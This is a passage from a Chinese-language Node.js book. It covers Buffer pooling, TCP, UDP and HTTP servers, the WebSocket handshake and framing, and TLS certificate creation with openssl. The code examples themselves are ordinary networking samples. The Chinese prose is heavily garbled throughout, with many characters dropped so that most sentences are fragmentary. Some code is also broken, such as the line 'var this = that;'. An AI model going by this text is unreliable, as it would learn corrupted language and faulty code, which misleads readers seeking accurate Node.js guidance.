{start: 90, end: 99}
fs.createReadStream()的工作是在内中一 Buffer，后在 fs.read()读时从中复到 Buffer 中。一次读时，从这个 Buffer 中过 slice()部分数作为一个小 Buffer 对，过 data 事用。Buffer 用，新分一个还有余，继续使用。下为分一个新的 Buffer 对的作
var pool;
function allocNewPool(poolSize) { pool = new Buffer(poolSize); pool.used = 0;
}
在想的下，次读的就是用定的 highWaterMark。是有可能读到了，者本就没有定的 highWaterMark 大，这个定的 Buffer 对会有部分余，不过好在这的内可以分下次读时使用。pool 是内的，只有 pool 余数量小于 128（kMinPoolSpace）时，才会新分一个新的 Buffer 对。Node 源中分
新的 Buffer 对的下
if (!pool || pool.length -pool.used < kMinPoolSpace) { // discard the old pool pool = null; allocNewPool(this.\_readableState.highWaterMark);
}
这与 Buffer 的内分，highWaterMark 的大小对性能有个的。
. highWaterMark 对 Buffer 内的分使用有一定。
. highWaterMark 过小，可能系统用次数过多。读于 Buffer 分，Buffer 于 SlowBuffer 分，这可以解为个的分。小（小于 8 KB），有可能 slab 能使用。由于 fs.createReadStream()内部用 fs.read()实，会起对的系统用，对于大
言，highWaterMark 的大小决定会触发系统用 data 事的次数。以下为 Node 自的测试，在 benchmark/fs/read-stream-throughput.js 中可以到
function runTest() { assert(fs.statSync(filename).size === filesize); var rs = fs.createReadStream(filename, {
highWaterMark: size, encoding: encoding });
rs.on('open', function() { bench.start(); });
var bytes = 0;
rs.on('data', function(chunk) { bytes += chunk.length; });
rs.on('end', function() { try { fs.unlinkSync(filename); } catch (e) {} // MB/sec bench.end(bytes / (1024 \* 1024));
}); }
下为次的
fs/read-stream-throughput.js type=buf size=1024: 46.284 fs/read-stream-throughput.js type=buf size=4096: 139.62 fs/read-stream-throughput.js type=buf size=65535: 681.88 fs/read-stream-throughput.js type=buf size=1048576: 857.98
从上的我们可以到，读一个相的大时，highWaterMark 的大小与读的关系大，读。

## 6.5 总结

过 JavaScript 友好的作后，有些开发者可能会定势，Buffer 做解。与 Buffer 之有实质上的，Buffer 是数，与 Buffer 之在编关系。因，解 Buffer 的多分要，对于高数分有用。

## 6.6 参考资源

本章参考的资源如下：

- http://nodejs.org/docs/latest/api/buffer.html
- http://nodejs.org/docs/latest/api/string_decoder.html
- https://github.com/bnoordhuis/node-iconv
- https://github.com/ashtuchkin/iconv-lite
- http://httpd.apache.org/docs/2.2/programs/ab.html
- http://cnodejs.org/user/fool
- http://en.wikipedia.org/wiki/Slab_allocation
- https://www.ibm.com/developerworks/cn/linux/l-linux-slab-allocator/

# 第 7 章 网络编程

Node 是一个网生的，它有事驱动、、线程性，好的可性，使它分量，在分网中样的。时 Node 的 API 分网，用它的 API 灵活的网服务。从本起，我 Node 在网服务的能。
用 Node 可以分网服务。在 Web，大多数的编程语言要门的 Web 服务作为，ASP、ASP.NET 要 IIS 作为服务，PHP 要 ApacheNginx 环境，JSP 要 Tomcat 服务。对于 Node 言，只要几可服务，外的。
Node 了 net、dgram、http、https 这 4 个，分用于 TCP、UDP、HTTP、HTTPS，用于服务端客端。

## 7.1 构建 TCP 服务

TCP 服务在网应用中分，目前大多数的应用都是于 TCP 的。
7.1.1TCP
TCP 为，在 OSI（由组，分为、数、网、、会、、应用）中于。多应用于 TCP，的是 HTTP、SMTP、IMAP。图图 7-1。

图 7-1 OSI（）
TCP 是接的，的是在之前要 3 次会，
图 7-2。

图 7-2 TCP 在之前的 3 次
只有会之后，服务端客端之才能相发数
。在创会的过程中，服务
端客端分一个接
，这个接一个接。服务端与客端过接实者之接的作。
7.1.2TCP
在本了解 TCP 的工作之后，我们可以开始创一个 TCP 服务端接网请，下
var net = require('net');
var server = net.createServer(function (socket) {
// 的接
socket.on('data', function (data) {
socket.write("");
});
socket.on('end', function () {
console.log('接开');
});
socket.write("入出 Node.js：\n");
});
server.listen(8124, function () {
console.log('server bound');
});
我们过 net.createServer(listener)可创一个 TCP 服务，listener 是接事 connection 的，也可以用下的
var server = net.createServer();
server.on('connection', function (socket) {
// 的接}); server.listen(8124);
我们可以用 Telnet 工作为客端对才创的服务会，相关下
\$ telnet 127.0.0.1 8124 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. 入出 Node.js：hi

了端外，样我们也可以对 Domain Socket，下
server.listen('/tmp/echo.sock');
过 nc 工会，测试上的 TCP 服务的下
\$ nc -U /tmp/echo.sock 入出 Node.js：hi

过 net 自客端会，测试上的 TCP 服务的下
var net = require('net');
var client = net.connect({port: 8124}, function () { //'connect' listener console.log('client connected'); client.write('world!\r\n');
});
client.on('data', function (data) { console.log(data.toString()); client.end();
});
client.on('end', function () { console.log('client disconnected'); });
以上客端为 client.js 并，下
\$ node client.js client connected 入出 Node.js：

client disconnected
与使用 Telnetnc 的会并。是 Domain Socket，在写时，写 path 可，下 var client = net.connect({path: '/tmp/echo.sock'});
7.1.3TCP
在上的中，分为服务事接事。

1.

对于过 net.createServer()创的服务言，它是一个 EventEmitter 实，它的自定事有下几。
. listening 在用 server.listen()定端者 Domain Socket 后触发，写为 server.listen(port,listeningListener)，过 listen()的个数入。
. connection 个客端接接到服务端时触发，写为过 net.create-
Server()，最后一个数。
. close 服务关时触发，在用 server.close()后，服务接新的接接，前在的接，有接都开后，会触发事。

. error 服务发生时，会触发事。一个使用中的端，会触发一个，不 error 事，服务会。

2.

服务可以时与多个客端接，对于个接言是的可写可读 Stream 对。Stream 对可以用于服务端客端之的信，可以过 data 事从一端读一端发的数，也可以过 write()从一端一端发数。它有下自定事。
. data 一端用 write()发数时，一端会触发 data 事，事的数是

write()发的数。. end 接中的一端发了 FIN 数时，会触发事。

. connect 事用于客端，接与服务端接时会触发。
. drain 一端用 write()发数时，前这端会触发事。

. error 发生时，触发事。
. close 接关时，触发事。. timeout 一定时后接不活跃时，事会触发，用前接已经了。

外，由于 TCP 接是可写可读的 Stream 对，可以用 pipe()实管作，下实了一个 echo 服务
var net = require('net');
var server = net.createServer(function (socket) { socket.write('Echo server\r\n'); socket.pipe(socket);
});
server.listen(1337, '127.0.0.1');
的是，TCP 对网中的小数包有一定的优 Nagle。次只发一个的内不优，网中只有极数有数的数包，分网源。Nagle 对这情，要区的数到一定数量者一定时后才发，以小数包会 Nagle 并，以优网。这优使网有使用，是数有可能发。
在 Node 中，由于 TCP 认用了 Nagle，可以用 socket.setNoDelay(true)Nagle，使 write()可以立发数到网中。
一个要的是，管在网的一端用 write()会触发一端的 data 事，是并不着次 write()都会触发一次 data 事，在关 Nagle 后，一端可能会接收到的多个小数包并，后只触发一次 data 事。

## 7.2 构建 UDP 服务

UDP 用数包，与 TCP 一样于网。UDP 与 TCP 最大的不是 UDP 不是接的。TCP 中接一立，有的会都于接
，客端要与一个 TCP 服务信，要创一个接接
。在 UDP 中，一个接可以与多个 UDP 服务信，它
事务的不可信服务，在网的情下在包的问题，是由于它接，源，且灵活，以应用在一个数包也不会产生大的场景，、。UDP 目前应用很广，DNS 服务是于它实的。
7.2.1UDP
创 UDP 接分，UDP 接一创，可以作为客端发数，也可以作为服务端接收数。下的创了一个 UDP 接
var dgram = require('dgram'); var socket = dgram.createSocket("udp4");
7.2.2UDP
想 UDP 接接收网，只要用 dgram.bind(port, [address])对网端定可。以下为一个的服务端
var dgram = require("dgram");
var server = dgram.createSocket("udp4");
server.on("message", function (msg, rinfo) { console.log("server got: " + msg + " from " + rinfo.address + ":" + rinfo.port); });
server.on("listening", function () { var address = server.address();
console.log("server listening " + address.address + ":" + address.port); });
server.bind(41234);
接接收有网上 41234 端上的。在定后，触发 listening 事。
7.2.3UDP
接下我们创一个客端与服务端对，下
var dgram = require('dgram');
var message = new Buffer("入出 Node.js");
var client = dgram.createSocket("udp4");
client.send(message, 0, message.length, 41234, "localhost", function(err, bytes) {
client.close();
});
为 client.js 并，服务端的会有下
\$ node server.js server listening 0.0.0.0:41234 server got:入出 Node.js from 127.0.0.1:58682
接对用在客端时，可以用 send()发到网中。send()的数下
socket.send(buf, offset, length, port, address, [callback])
这些数分为要发的 Buffer、Buffer 的、Buffer 的、目端、目、发后的。与 TCP 接的 write()相，send()的数相对复杂，是它灵活的在于可以发数到网中的服务端，TCP 要发数一个服务端，
要新过接新的接。
7.2.4UDP
UDP 接相对 TCP 接使用起，它只是一个 EventEmitter 的实，Stream 的实。它下自定事。
. messageUDP 接网端后，接收到时触发事，触发的数为 Buffer 对一个程信。
. listeningUDP 接开始时触发事。
. close 用 close()时触发事，并不触发 message 事。次触发 message 事，新定可。

. error 发生时触发事，不，接，使程。

## 7.3 构建 HTTP 服务

TCP 与 UDP 都于网，要高的网应用，就应从着。
是对于经的应用场景，从入自己的应用，HTTPSMTP，这些经的应用对于应用言有余。Node 了本的 httphttps 用于 HTTP HTTPS 的，对于他应用的，也能从社区中到实。
在 Node 中 HTTP 服务极，Node 网上的经就了用寥寥几实一个 HTTP 服务，下
var http = require('http');
http.createServer(function (req, res) {
res.writeHead(200, {'Content-Type': 'text/plain'});
res.end('Hello World\n');
}).listen(1337, '127.0.0.1');
console.log('Server running at http://127.0.0.1:1337/');
管这个 HTTP 服务到只能复 Hello World，是它能的并发量 QPS 都是不小的，后的因在 3 中有，我们不探。这我们开性能，只对 HTTP 服务在应用的实开、研。
7.3.1HTTP
1- HTTP
HTTP 的是本，写作 HyperTextTransfer Protocol。了解 Web，了解 HTTP 会极大高我们对 Web 的认。HTTP 在 TCP 之上，于应用。在 HTTP 的端是服务，的 B/S，今的 Web 是 HTTP 的应用。
HTTP 以发是 W3CIETF 个组织作的，他们最发了一系 RFC，目前最的 HTTP 为 RFC2616。
2- HTTP
为了解 HTTP 的，在动上服务端后，我们对经一次的，这用的工是 curl，过-v，可以这次网信的有信，下
\$ curl -v http://127.0.0.1:1337

-

About to connect() to 127.0.0.1 port 1337 (#0) \* Trying 127.0.0.1...

-

connected

-

Connected to 127.0.0.1 (127.0.0.1) port 1337 (#0) > GET / HTTP/1.1 > User-Agent: curl/7.24.0 (x86*64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5 > Host: 127.0.0.1:1337 > Accept: */\_ > < HTTP/1.1 200 OK < Content-Type: text/plain < Date: Sat, 06 Apr 2013 08:01:44 GMT < Connection: keep-alive < Transfer-Encoding: chunked < Hello World

-

Connection #0 to host 127.0.0.1 left intact

-

Closing connection #0

从上信中我们可以到这次网信的信分为几个部分，一部分内为经的 TCP 的 3 次过程，下

-

About to connect() to 127.0.0.1 port 1337 (#0) \* Trying 127.0.0.1...

-

connected

-

Connected to 127.0.0.1 (127.0.0.1) port 1337 (#0)

部分是在之后，客端服务端发请，下

> GET / HTTP/1.1 > User-Agent: curl/7.24.0 (x86*64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5 > Host: 127.0.0.1:1337 > Accept: */\_ >
> 部分是服务端后，客端发应内，包括应应，下
> < HTTP/1.1 200 OK < Content-Type: text/plain < Date: Sat, 06 Apr 2013 08:01:44 GMT < Connection: keep-alive < Transfer-Encoding: chunked < Hello World
> 最后部分是会的信，下

-

Connection #0 to host 127.0.0.1 left intact

-

Closing connection #0

从上的信中可以 HTTP 的，它是于请应的，以一问一的实服务，于 TCP 会，是本并会的。
从的，在的应用，，实是一个 HTTP 的，用的为会过它为 HTTP 请发服务端，服务端在请后，发应，在解后，用要的内在上。以开一图为，HTTP 发图服务端后，服务端中的要请的，中的图以的发接收图后，用用。言之，HTTP 服务只做事情 HTTP 请发 HTTP 应。
是 HTTP 请还是 HTTP 应，内都包个部分。
上的中><部分于的部，由于是 GET 请，请中没有包，应中的 Hello World 是。
7.3.2http
Node 的 http 包对 HTTP 的。在 Node 中，HTTP 服务继自 TCP 服务（net），它能与多个客端接，由于用事驱动的，并不为一个接创外的线程程，很的内用，以能实高并发。HTTP 服务与 TCP 服务有区的
在于，在开 keepalive 后，一个 TCP 会可以用于多次请应。TCP 服务以 connection 为服务，HTTP 服务以 request 为服务。http 是 connection 到 request 的过程了，图图 7-3。

图 7-3 httpconnection 到 request 的过程了
之外，http 接用接的读写为 ServerRequestServerResponse 对，它们分对应请应作。在请产生的过程中，http 到接中的数，用 http_parser 解，在解请的后，触发 request 事，用用的务。程的图图 7-4。

图 7-4 http 产生请的程
图 7-4 中的程序对应到中的就是应 Hello World 这部分，下
function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n');
}
1- HTTP
对于 TCP 接的读作，http 为 ServerRequest 对。我们次前的请，部会过 http_parser 解。请的下

> GET / HTTP/1.1 > User-Agent: curl/7.24.0 (x86*64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5 > Host: 127.0.0.1:1337 > Accept: */\_ >
> 一 GET / HTTP/1.1 解之后分解为下性。
> . req.method 性为 GET，是为请，的请有 GET、POST、DELETE、PUT、CONNECT 几。
> . req.url 性为/。. req.httpVersion 性为 1.1。余是很的 Key: Value，解后在 req.headers 性上务以

用，下
headers:  
{ 'user-agent': 'curl/7.24.0 (x86*64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5',
host: '127.0.0.1:1337',
accept: '*/\_' },
部分为一个只读对，务要读中的数，要在这个数后才能作，下
function (req, res) {
// console.log(req.headers);
var buffers = [];
req.on('data', function (trunk) {
buffers.push(trunk);
}).on('end', function () {
buffer = Buffer.concat(buffers);
// var TODO
res.end('Hello world');
});
}
HTTP 请对 HTTP 应对是相对的，的 WebConnectExpress 都是在这个对的上高的。
2- HTTP
HTTP 应对。HTTP 应相对一些，它了对接的写作，可以一个可写的对。它应部信的 API 为 res.setHeader() res. writeHead()。在上中
res.writeHead(200, {'Content-Type': 'text/plain'});
分为 setHeader()writeHead()个。它在 http 的下，实生下
< HTTP/1.1 200 OK < Content-Type: text/plain
我们可以用 setHeader 多次，只有用 writeHead 后，才会写入到接中
。之外，http 会自动你一些信，下
< Date: Sat, 06 Apr 2013 08:01:44 GMT < Connection: keep-alive < Transfer-Encoding: chunked <
部分是用 res.write()res.end()实，后者与前者的在于 res.end()会用 write()发数，后发信服务这次应，应下
Hello World
应后，HTTP 服务可能会前的接用于下一个请，者关接。的是，是在发前发的，一开始了数的发，writeHead()setHeader()不生。这由的性决定。
外，服务端在务时是否发生，务在时用 res.end()请
，否客端一于的。，也可以过 res.end()的实客端与服务端之的接，时。
3- HTTP
TCP 服务一样，HTTP 服务也了一些事，以应用使用，样的是，服务也是一个 EventEmitter 实。
. connection 事在开始 HTTP 请应前，客端与服务端要立的 TCP 接，这个接可能因为开了 keep-alive，可以在多次请应之使用
这个接立时，服务触发一次 connection 事。

. request 事立 TCP 接后，http 在数中 HTTP 请 HTTP 应，请数发到服务端，在解 HTTP 请后，会触发事在 res.end()
后，TCP 接可能用于下一次请应。
. close 事与 TCP 服务的为一，用 server.close()接新的接，已有的接都开时，触发事可以 server.close()一个数事。
. checkContinue 事些客端在发大的数时，并不会数接发，是发一个部 Expect: 100-continue 的请到服务，服务会触发 checkContinue 事没有为服务这个事，服务会自动应客端 100 Continue 的，接数上不接数的多时，应客端 400 Bad Request 绝客端继续发数可。要的是，事发生时不会触发 request 事，个事之。客端收到 100 Continue 后新发起请时，才会触发 request 事
。
. connect 事客端发起 CONNECT 请时触发，发起 CONNECT 请在 HTTP 时不事，发起请的接会关。
. upgrade 事客端要接的时，要服务端，客端会在请中上 Upgrade，服务端会在接收到这样的请时触发事。这在后的 WebSocket 部分有程的。不事，发起请的接会关。
. clientError 事接的客端触发 error 事时，这个会到服务端，时触发事。

7.3.3HTTP
在对服务端的实了后，HTTP 客端的几不用，因为它就是服务端服务的一部分，于 HTTP 的一端，在个的与中，由它产生。时 http 了一个 APIhttp.request(options, connect)，用于 HTTP 客端。
下的与上的 curl 大相
var options = { hostname: '127.0.0.1', port: 1334, path: '/', method: 'GET'
};
var req = http.request(options, function(res) { console.log('STATUS: ' + res.statusCode); console.log('HEADERS: ' + JSON.stringify(res.headers)); res.setEncoding('utf8'); res.on('data', function (chunk) {
console.log(chunk); }); });
req.end();
上到以下
\$ node client.js STATUS: 200 HEADERS: {"date":"Sat, 06 Apr 2013 11:08:01 GMT","connection":"keep-alive","transfer-encoding":"chunked"} Hello World
中 options 数决定了这个 HTTP 请中的内，它的有下这些。
. host 服务的 IP，认为 localhost。
. hostname 服务。. port 服务端，认为 80。

. localAddress 立网接的本网。

. socketPathDomain 接。
. methodHTTP 请，认为 GET。
. path 请，认为/。
. headers 请对。
. authBasic 认，这个请中的 Authorization 部分。

的内由请对的 write()end()实过 write()接中写入数，
过 end()。它与中的 Ajax 用几相，Ajax 的实质就是一个的
网 HTTP 请。
1- HTTP
HTTP 客端的应对与服务端为，在 ClientRequest 对中，它的事做 response。ClientRequest 在解应时，一解应就触发 response 事，时一个应对以作 ClientResponse。后续应以只读的，下
function(res) { console.log('STATUS: ' + res.statusCode); console.log('HEADERS: ' + JSON.stringify(res.headers)); res.setEncoding('utf8'); res.on('data', function (chunk) {
console.log(chunk); }); }
由于从应读数与服务端 ServerRequest 读数的为为，不。
2- HTTP
服务端的实一，http 的 ClientRequest 对也是于 TCP 实的，在 keepalive 的情下，一个会接可以多次用于请。为了用 TCP 接，http 包一
个认的客端对 http.globalAgent。它对个服务端（host + port）创的接了管，认情下，过 ClientRequest 对对一个服务端发起的 HTTP 请最多可以创 5
个接。它的实质是一个接，图图 7-5。

图 7-5 HTTP 对服务端创的接管

用 HTTP 客端时对一个服务发起 10 次 HTTP 请时，实质只有 5 个请于并发
，后续的请要个请服务后才发。这与对一个有下接数的是相的为。
你在服务端过 ClientRequest 用网中的他 HTTP 服务，关对对网请的。一请量过大，接会服务性能。要，可以在 options 中 agent。认情下，请会用的对，认接数的为 5。
我们可以自对，下
var agent = new http.Agent({
maxSockets: 10 }); var options = {
hostname: '127.0.0.1', port: 1334, path: '/', method: 'GET', agent: agent
};
也可以 agent 为 false，以接的管，使请不并发的。Agent 对的 socketsrequests 性分前接中使用中的接数于的请数，在务中这个有于发务的程。
3- HTTP
与服务端对应的，HTTP 客端也有相应的事。
. response 与服务端的 request 事对应的客端在请发后到服务端应时，会触发事。
. socket 接中立的接分前请对时，触发事。
. connect 客端服务端发起 CONNECT 请时，服务端应了 200，客
端会触发事。
. upgrade 客端服务端发起 Upgrade 请时，服务端应了 101 Switching Protocols，客端会触发事。

. continue 客端服务端发起 Expect: 100-continue 信，以试图发大数量，
服务端应 100 Continue，客端触发事。

## 7.4 构建 WebSocket 服务

到 Node，不能过的是 WebSocket。它与 Node 之的，由有。
. WebSocket 客端于事的编程与 Node 中自定事相几。
. WebSocket 实了客端与服务端之的接，Node 事驱动的分与大

量的客端高并发接。之外，WebSocket 与统 HTTP 有下好。
客端与服务端只立一个 TCP 接，可以使用的接。
. WebSocket 服务端可以推数到客端，这 HTTP 请应灵活、高。
有量的，数量。
WebSocket 最是作为 HTML5 要性的，最在 W3CIETF 的推动下，RFC 6455。大多都 WebSocket，接下我们用一 WebSocket 在客端的应用
var socket = new WebSocket('ws://127.0.0.1:12010/updates');
socket.onopen = function () {
setInterval(function() {
if (socket.bufferedAmount == 0)
socket.send(getUpdateData());
}, 50);
};
socket.onmessage = function (event) {
// TODO：event.data
};
上中，与服务端创 WebSocket 请，在请后接开，50 服务端发一次数，时可以过 onmessage()接收服务端的数
。这为与 TCP 客端分相，相于 HTTP，它能信。一能使用 WebSocket，可以想应用的使用极大。
在 WebSocket 之前，网页客端与服务端信最高的是 Comet 技术。实 Comet 技术的是用（long-polling）iframe。的是客端服务端发起请，服务端只在时有数应时开接（res.end()）客端在收到数者时后新发起请。这个请为着的，是用 Comet（）它。
使用 WebSocket 的，网页客端只一个 TCP 接可信，在服务端与客端信时，开接发请。接可以到高应用，编程也分。
前也多到了 WebSocket 与 HTTP 的区，相 HTTP，WebSocket 接于，它并没有在 HTTP 的上服务端的推，是在 TCP 上定立的。人的部分在于 WebSocket 的部分是由 HTTP 的，使人它可能是于 HTTP 实的。
WebSocket 要分为个部分数。下我们一这个部分。
7.4.1WebSocket
客端立接时，过 HTTP 发起请，下
GET /chat HTTP/1.1 Host: server.example.com Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== Sec-WebSocket-Protocol: chat, superchat Sec-WebSocket-Version: 13
与的 HTTP 请有区的部分在于下这些
Upgrade: websocket Connection: Upgrade
上个请服务端为 WebSocket。中 Sec-WebSocket-Key 用于
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Key 的是机生的 Base64 编的。服务端接收到之后与 258EAFA5-E914-47DA-95CA-C5AB0DC85B11 相，dGhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11，后过 sha1 后，Base64 编，最后客端。这个下
var crypto = require('crypto'); var val = crypto.createHash('sha1').update(key).digest('base64');
外，下个定本
Sec-WebSocket-Protocol: chat, superchat Sec-WebSocket-Version: 13
服务端在请后，应下
HTTP/1.1 101 Switching Protocols Upgrade: websocket Connection: Upgrade Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo= Sec-WebSocket-Protocol: chat
上的之客端在，新应用为 WebSocket，并在前的接接上应用新。余的分服务端于 Sec-WebSocket-Key 生的中的。客端会 Sec-WebSocket-Accept 的，，开始接下的数。
这我们用 Node 发起的为，下
var WebSocket = function (url) { // 代码解析 ws://127.0.0.1:12010/updates 用请求 this.options = parseUrl(url); this.connect();
}; WebSocket.prototype.onopen = function () { // TODO };
WebSocket.prototype.setSocket = function (socket) { this.socket = socket; };
WebSocket.prototype.connect = function () { var this = that; var key = new Buffer(this.options.protocolVersion + '-' + Date.now()).toString('base64'); var shasum = crypto.createHash('sha1');
var expected = shasum.update(key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64');
var options = { port: this.options.port, // 12010 host: this.options.hostname, // 127.0.0.1 headers: {
'Connection': 'Upgrade', 'Upgrade': 'websocket', 'Sec-WebSocket-Version': this.options.protocolVersion, 'Sec-WebSocket-Key': key
} }; var req = http.request(options); req.end();
req.on('upgrade', function(res, socket, upgradeHead) { //接成功 that.setSocket(socket); //发 open 事件 that.onopen();
}); };
下是服务端的应为
var server = http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n');
}); server.listen(12010);
//在收 upgrade 请求客户端换
server.on('upgrade', function (req, socket, upgradeHead) { var head = new Buffer(upgradeHead.length); upgradeHead.copy(head); var key = req.headers['sec-websocket-key']; var shasum = crypto.createHash('sha1'); key = shasum.update(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").digest('base64'); var headers = [
'HTTP/1.1 101 Switching Protocols', 'Upgrade: websocket', 'Connection: Upgrade', 'Sec-WebSocket-Accept: ' + key, 'Sec-WebSocket-Protocol: ' + protocol
]; // 数据发 socket.setNoDelay(true); socket.write(headers.concat('', '').join('\r\n')); // 建服务器端 WebSocket 接 var websocket = new WebSocket(); websocket.setSocket(socket);
});
一 WebSocket，服务端与客端会对的，都能接收发。
7.4.2WebSocket
在后，前接不 HTTP 的，是开始 WebSocket 的数，实客端与服务端的数。图 7-6 为过程图。

图 7-6 过程图
后，客端的 onopen()会触发，下
socket.onopen = function () {
// TODO: opened()
};
服务端没有 onopen()可言。为了 TCP 接事到 WebSocket 事的，要
在接收数时，WebSocket 的数是在 data 事上的，下
WebSocket.prototype.setSocket = function (socket) {
this.socket = socket;
this.socket.on('data', this.receiver);
};
样的数发时，也要做作，下
WebSocket.prototype.send = function (data) { this.\_send(data); }; 客端用 send()发数时，服务端触发 onmessage()服务端用 send()发数时，客端的 onmessage()触发。我们用 send()发一数时，可能这个数为一多数，后发。为了，客端要对发的数，服务一收到（
中），接关。服务发到客端的数做，样，
客端收到的数，接也关。
我们以客端发 hello world!到服务端，服务端以 yakexi 作为一个程研数的实过程。
图 7-7 中为 WebSocket 数的定，8 为一，也 1 个。中一都有它的。

图 7-7 WebSocket 数的定
. fin 这个数是最后一，这个 fin 为 1，余情为 0。一个数没有分为多时，它是一也是最后一。
. rsv1、rsv2、rsv3 为 1，3 个识用于，有已的时，这些可能为 1，余情为 0。
. opcode 为 4 的作，可以用 0 到 15 的，用于解前数。0 加数，1 本数，2 数，8 发一个接关的数，9 ping 数，10pong 数，余时没有定。ping 数 pong 数用于心测，一端发 ping 数时，一端发 pong 数作为应，对这一端于应。
. masked 是否，为 1。客端发服务端时为 1，服务端发客端时为 0。
. payload length 一个 7、7+167+64 的数，识数的，在 0~125 之，就是数的实是 126，后 16 的是数的实是 127，后 64 的是数的实。
. masking keymasked 为 1 时在，是一个 32 的数，用于解数。
. payload data 我们的目数，数为 8 的数。
客端发时，要一个多个数。由于 hello world!，不在分为多个数的情，由于 hello world!会以本的发，它的 payload length 为 96（128/），为 1100000。以应下
fin(1) + res(000) + opcode(0001) + masked(1) + payload length(1100000) + masking key(32 位) + payload data(hello world!加密的进制)
以本发时，本的编为 UTF-8，由于这发的不在中，以一个一个，8。
客端发后，服务端在 data 事中接收到这些编数，后解为相应的数，以数的，过的数解，后触发 onmessage()，下
socket.onmessage = function (event) {
// TODO: event.data
};
服务端复 yakexi 的时候，下的事情就是，余相，下
fin(1) + res(000) + opcode(0001) + masked(0) + payload length(1100000) + payload data(yakexi 的进制)
这的为与 TCP 接的为分，可以解为 TCP 客端接的 connect 事 data 事。
至，WebSocket 的，解数触发 onmessage()，请 ws 的实，由于有过多，这不开。
7.4.3
在有的 WebSocket 服务端实中，没有 NodeWebSocket 的使用了。它们的性有以下内。于事的编程接。
于 JavaScript，以好的 WebSocket 实，API 与客端可以高相。
外，Node 于事驱动的使它应对 WebSocket 这接的应用场景可以大量并发请。管 Node 没有内 WebSocket 的，是社区的 ws 了 WebSocket 的实。socket.io 是在它的上实的。

## 7.5 网络服务与安全

在网中，数在服务端客端之，由于是的内，一在网人，数就可能一余在中的者前。为我们要数加后网，这样使数，者也数的实内是。是对于我们的应用言，HTTP、FTP，我们能数，心网过程中的问题。在网景的 NetScape 推之初就了 SSL（Secure Sockets Layer，
接）。SSL 作为一，它在
对网接加
的能。对于应用
言，它是的，数在到应用之前就已经了加解的过程。最初的 SSL 应用在 Web 上，服务端端时，后 IETF，为 TLS
（Transport Layer Security，）。
Node 在网上了 3 个，分为 crypto、tls、https。中 crypto 要用于加解，SHA1、MD5 加都在中有，在这我们不用。用于网的是外个，tls 了与 net 的能，区在于它立在 TLS/SSL 加的 TC
P 接上。对于 https 言，它与 http 接一，区也仅在于它立于的接之上。
7.5.1TLS/SSL

1.

TLS/SSL 是一个/的，它是一个对的
，个服务端客端都有自
己的
。用加要的数，用解接收到的数
。是对的，过加的数，只有过才能解，以在立之前，客端服务端之
要。客端发数时要过服务端的加，服务端发数时要客端的加，才能加解的过程，图 7-8。

图 7-8 客端服务端
Node 在用的是 openssl 实 TLS/SSL 的
，为要生可以过 openssl。我们分为服务端客端生，下
//生成服务器端私$ openssl genrsa -out server.key 1024 //生成客户端私$ openssl genrsa -out client.key 1024
上生了个 1024 的 RSA，我们可以过它继续生，下
$ openssl rsa -in server.key -pubout -out server.pem $ openssl rsa -in client.key -pubout -out client.pem
的对加好，是网中可能在的情，的是中人。客端服务端在的过程中，中人对客端服务端的，对服务端客端的，因客端服务端几不到中人的在。为了解决这问题，数过程中还要对到的认，以认到的是自目服务。不能这认，中人可能会的应用，从经。图 7-9 是中人的图。

图 7-9 中人图
为了解决这个问题，TLS/SSL 入了数书认。与接用不，数书中包了服务的机、服务的、发机的、自发机的。在接立前，会过书中的认收到的是自目服务的，从产生信关系。

2.

为了我们的数，在我们入了一个 CA（Certificate Authority，数
书认中心）。CA 的作用是为发书，且这个书中有 CA 过自己的实的。
为了到书，服务端要过自己的生 CSR（Certificate Signing Request，书请）。CA 机过这个发于服务端的书，只要过 CA 机就能书是否。
过 CA 机发书是一个的过程，要一定的用
。对于中小
言，多是用自书网的。自书，就是自己 CA 机，自己的服务端发书。以下为生、生 CSR、过自生书的过程
$ openssl genrsa -out ca.key 1024 $ openssl req -new -key ca.key -out ca.csr \$ openssl x509 -req -in ca.csr -signkey ca.key -out ca.crt
程图 7-10。

图 7-10 生自书图
上了 CA 要的。接下到服务端，服务端要 CA 机
请书。在请书之前是要创自己的 CSR。
的是，这个过程中的 Common Name 要服务，否在后续的认过程中会。下是生 CSR 用的
$ openssl req -new -key server.key -out server.csr 
到CSR后，我们自己的CA机请。过程要CA的书与，
最发一个有CA的书，下
$ openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -in server.csr -out server.crt
客端在发起接前会服务端的书，并过 CA 的书服务端书的
。了外，还有对服务、IP 的过程。这个过程图 7-11。

图 7-11 客端过 CA 服务端书的过程图
CA 机书发服务端后，书在请的过程中会发客端
，客端要过 CA 的书。是的 CA 机，它们的书一在中。是自己 CA 机，发自有书不能享这个，客端要到 CA 的书才能
。
上的过程中可以，书是一环一环发的，是在 CA 的书是不要上书与的，这个书我们为书。
7.5.2TLS

1.

服务要的书都之后，我们过 Node 的 tls 创一个的 TCP 服务，这个服务是一个的 echo 服务，下
var tls = require('tls'); var fs = require('fs');
var options = { key: fs.readFileSync('./keys/server.key'), cert: fs.readFileSync('./keys/server.crt'), requestCert: true, ca: [ fs.readFileSync('./keys/ca.crt') ]
};
var server = tls.createServer(options, function (stream) { console.log('server connected', stream.authorized ? 'authorized' : 'unauthorized'); stream.write("welcome!\n"); stream.setEncoding('utf8'); stream.pipe(stream);
}); server.listen(8000, function() {
console.log('server bound'); });
动上服务后，过下的可以测试书是否
\$ openssl s_client -connect 127.0.0.1:8000

2. TLS
   为了个系，接下我们用 Node 客端，net 一样，tls 也了 connect()客端。在我们的客端之前，要为客端生于自己的
   ，下
